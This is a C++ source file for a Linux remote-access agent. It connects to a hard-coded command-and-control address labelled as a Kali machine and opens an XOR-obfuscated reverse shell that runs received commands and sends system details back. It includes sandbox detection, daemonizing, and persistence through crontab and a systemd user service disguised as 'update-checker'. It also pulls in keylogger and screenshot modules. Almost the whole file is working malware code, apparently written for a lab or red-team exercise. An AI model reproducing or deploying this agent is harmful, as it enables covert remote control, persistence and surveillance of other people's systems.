// agent_linux.cpp
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <sys/stat.h>
#include <pwd.h>
#include <sys/utsname.h>
#include <string>
#include <sstream>
#include <fstream>

// ============= CONFIGURATION =============
#define C2_SERVER "10.28.104.143"  // Kali IP
#define C2_PORT 4444
#define SLEEP_TIME 5
#define XOR_KEY 0x42
#define BUFFER_SIZE 8192

// ============= DEBUG LOGGING =============
#ifdef DEBUG
    #define LOG(msg) WriteLog(msg)
    void WriteLog(const char* msg) {
        FILE* f = fopen("/tmp/agent_log.txt", "a");
        if (f) {
            time_t now = time(NULL);
            fprintf(f, "[%ld] %s\n", now, msg);
            fclose(f);
        }
    }
#else
    #define LOG(msg)
#endif

//=============================================================================
// EVASION & PERSISTENCE
//=============================================================================

bool IsSandbox() {
    LOG("Checking for sandbox...");
    int detectionCount = 0;
    
    // Check for common sandbox indicators
    if (access("/sys/hypervisor", F_OK) == 0) detectionCount++;
    if (access("/proc/vz", F_OK) == 0) detectionCount++;  // OpenVZ
    if (access("/proc/bc", F_OK) == 0) detectionCount++;   // Virtuozzo
    
    // Check uptime (less than 10 minutes)
    FILE* f = fopen("/proc/uptime", "r");
    if (f) {
        double uptime;
        if (fscanf(f, "%lf", &uptime) == 1) {
            if (uptime < 600) detectionCount++;
        }
        fclose(f);
    }
    
    // Check CPU count
    long nprocs = sysconf(_SC_NPROCESSORS_ONLN);
    if (nprocs < 2) detectionCount++;
    
    bool isSandbox = (detectionCount >= 2);
    if (isSandbox) {
        LOG("Sandbox detected!");
    }
    return isSandbox;
}

bool InstallCronPersistence() {
    LOG("Installing cron persistence...");
    
    char exePath[1024];
    ssize_t len = readlink("/proc/self/exe", exePath, sizeof(exePath) - 1);
    if (len == -1) return false;
    exePath[len] = '\0';
    
    // Add to crontab
    char cmd[2048];
    snprintf(cmd, sizeof(cmd), 
        "(crontab -l 2>/dev/null; echo \"@reboot %s &\") | crontab -", exePath);
    
    int ret = system(cmd);
    LOG(ret == 0 ? "Cron persistence installed" : "Cron persistence failed");
    return (ret == 0);
}

bool InstallSystemdPersistence() {
    LOG("Installing systemd persistence...");
    
    char exePath[1024];
    ssize_t len = readlink("/proc/self/exe", exePath, sizeof(exePath) - 1);
    if (len == -1) return false;
    exePath[len] = '\0';
    
    const char* home = getenv("HOME");
    if (!home) return false;
    
    char servicePath[1024];
    snprintf(servicePath, sizeof(servicePath), 
        "%s/.config/systemd/user/update-checker.service", home);
    
    // Create .config/systemd/user directory
    char dirPath[1024];
    snprintf(dirPath, sizeof(dirPath), "%s/.config/systemd/user", home);
    system(("mkdir -p " + std::string(dirPath)).c_str());
    
    FILE* f = fopen(servicePath, "w");
    if (!f) return false;
    
    fprintf(f, "[Unit]\n");
    fprintf(f, "Description=System Update Checker\n");
    fprintf(f, "After=network.target\n\n");
    fprintf(f, "[Service]\n");
    fprintf(f, "ExecStart=%s\n", exePath);
    fprintf(f, "Restart=always\n");
    fprintf(f, "RestartSec=10\n\n");
    fprintf(f, "[Install]\n");
    fprintf(f, "WantedBy=default.target\n");
    fclose(f);
    
    system("systemctl --user daemon-reload");
    system("systemctl --user enable update-checker.service");
    system("systemctl --user start update-checker.service");
    
    LOG("Systemd persistence installed");
    return true;
}

//=============================================================================
// NETWORK
//=============================================================================

void XorCrypt(unsigned char* data, size_t size, unsigned char key) {
    for (size_t i = 0; i < size; i++) {
        data[i] ^= key;
    }
}

int ConnectToC2(const char* server, int port) {
    char logMsg[256];
    snprintf(logMsg, sizeof(logMsg), "Connecting to %s:%d", server, port);
    LOG(logMsg);
    
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        LOG("Socket creation failed");
        return -1;
    }
    
    struct sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    
    if (inet_pton(AF_INET, server, &serverAddr.sin_addr) <= 0) {
        LOG("Invalid address");
        close(sock);
        return -1;
    }
    
    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        snprintf(logMsg, sizeof(logMsg), "Connection failed: %s", strerror(errno));
        LOG(logMsg);
        close(sock);
        return -1;
    }
    
    LOG("Connected successfully!");
    return sock;
}

bool SendData(int sock, const char* data, size_t len) {
    size_t totalSent = 0;
    while (totalSent < len) {
        ssize_t sent = send(sock, data + totalSent, len - totalSent, 0);
        if (sent < 0) return false;
        totalSent += sent;
    }
    return true;
}

//=============================================================================
// SYSTEM INFO
//=============================================================================

std::string GetSystemInfo() {
    char hostname[256];
    char username[256];
    struct utsname unameData;
    
    gethostname(hostname, sizeof(hostname));
    
    struct passwd* pw = getpwuid(getuid());
    if (pw) {
        strncpy(username, pw->pw_name, sizeof(username) - 1);
    } else {
        strcpy(username, "unknown");
    }
    
    uname(&unameData);
    
    char cwd[1024];
    getcwd(cwd, sizeof(cwd));
    
    char buffer[2048];
    snprintf(buffer, sizeof(buffer), "SYSINFO|%s|%s|%s %s|%s",
        hostname, username, unameData.sysname, unameData.release, cwd);
    
    return std::string(buffer);
}

//=============================================================================
// SHELL EXECUTION
//=============================================================================

std::string currentDirectory;

std::string GetCurrentDir() {
    char buffer[1024];
    if (getcwd(buffer, sizeof(buffer)) != NULL) {
        return std::string(buffer);
    }
    return "/tmp";
}

std::string ExecuteCommand(const char* command) {
    std::string cmd(command);
    
    // Handle CD command
    if (cmd.substr(0, 3) == "cd ") {
        std::string newDir = cmd.substr(3);
        // Trim whitespace
        size_t start = newDir.find_first_not_of(" \t\r\n");
        size_t end = newDir.find_last_not_of(" \t\r\n");
        if (start != std::string::npos) {
            newDir = newDir.substr(start, end - start + 1);
        }
        
        if (chdir(newDir.c_str()) == 0) {
            currentDirectory = GetCurrentDir();
            return currentDirectory + "\n";
        } else {
            return "Error: Directory not found\n";
        }
    }
    
    // Execute command
    std::string fullCmd = "cd " + currentDirectory + " && " + cmd + " 2>&1";
    
    FILE* pipe = popen(fullCmd.c_str(), "r");
    if (!pipe) {
        return "Error: Command execution failed\n";
    }
    
    std::string result;
    char buffer[4096];
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        result += buffer;
    }
    
    pclose(pipe);
    return result;
}

//=============================================================================
// REVERSE SHELL
//=============================================================================

void ReverseShell(int sock) {
    LOG("Entering reverse shell");
    char buffer[BUFFER_SIZE];
    
    // Initialize current directory
    currentDirectory = GetCurrentDir();
    
    // Send system info
    std::string sysInfo = GetSystemInfo();
    LOG("Sending system info");
    SendData(sock, sysInfo.c_str(), sysInfo.length());
    SendData(sock, "\n", 1);
    
    while (true) {
        memset(buffer, 0, sizeof(buffer));
        ssize_t bytesReceived = recv(sock, buffer, sizeof(buffer) - 1, 0);
        
        if (bytesReceived <= 0) {
            LOG("Connection closed");
            break;
        }
        
        // Find newline
        int cmdLen = bytesReceived;
        for (int i = 0; i < bytesReceived; i++) {
            if (buffer[i] == '\n' || buffer[i] == '\r') {
                cmdLen = i;
                break;
            }
        }
        
        // Decrypt
        XorCrypt((unsigned char*)buffer, cmdLen, XOR_KEY);
        buffer[cmdLen] = '\0';
        
        // Trim
        char* cmd = buffer;
        while (*cmd == ' ' || *cmd == '\t') cmd++;
        
        if (strlen(cmd) == 0) continue;
        
        LOG(cmd);
        
        // Handle exit
        if (strcmp(cmd, "exit") == 0) {
            LOG("Exit command received");
            break;
        }
        
        // Handle persist
        if (strncmp(cmd, "persist", 7) == 0) {
            bool success = InstallCronPersistence() || InstallSystemdPersistence();
            std::string response = success ? "PERSIST|SUCCESS\n" : "PERSIST|FAILED\n";
            SendData(sock, response.c_str(), response.length());
            continue;
        }
        
        // Handle sysinfo
        if (strcmp(cmd, "sysinfo") == 0) {
            std::string info = GetSystemInfo() + "\n";
            SendData(sock, info.c_str(), info.length());
            continue;
        }
        
        // Execute command
        std::string output = ExecuteCommand(cmd);
        
        // Encrypt and send
        XorCrypt((unsigned char*)&output[0], output.length(), XOR_KEY);
        SendData(sock, output.c_str(), output.length());
        SendData(sock, "\n", 1);
    }
    
    close(sock);
    LOG("Shell closed");
}

//=============================================================================
// DAEMONIZE
//=============================================================================

void Daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);  // Parent exits
    
    if (setsid() < 0) exit(1);
    
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    
    pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);
    
    umask(0);
    chdir("/");
    
    // Close standard file descriptors
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    
    // Redirect to /dev/null
    open("/dev/null", O_RDONLY);
    open("/dev/null", O_WRONLY);
    open("/dev/null", O_WRONLY);
}

//=============================================================================
// MAIN
//=============================================================================

int main(int argc, char* argv[]) {
    LOG("Agent started");
    
    // Daemonize (background process)
    #ifndef DEBUG
    Daemonize();
    #endif
    
    // SANDBOX CHECK - commented for testing
    // if (IsSandbox()) {
    //     LOG("Sandbox detected - exiting");
    //     sleep(60);
    //     return 0;
    // }
    
    LOG("Starting connection loop");
    while (true) {
        int sock = ConnectToC2(C2_SERVER, C2_PORT);
        if (sock >= 0) {
            ReverseShell(sock);
        }
        
        LOG("Sleeping before retry");
        sleep(SLEEP_TIME);
    }
    
    return 0;
}

// Include surveillance headers
#ifdef _WIN32
    #include "surveillance/keylogger.cpp"
    #include "surveillance/screenrecorder.cpp"
#else
    #include "surveillance/keylogger_linux.cpp"
    #include "surveillance/screenshot_linux.cpp"
#endif
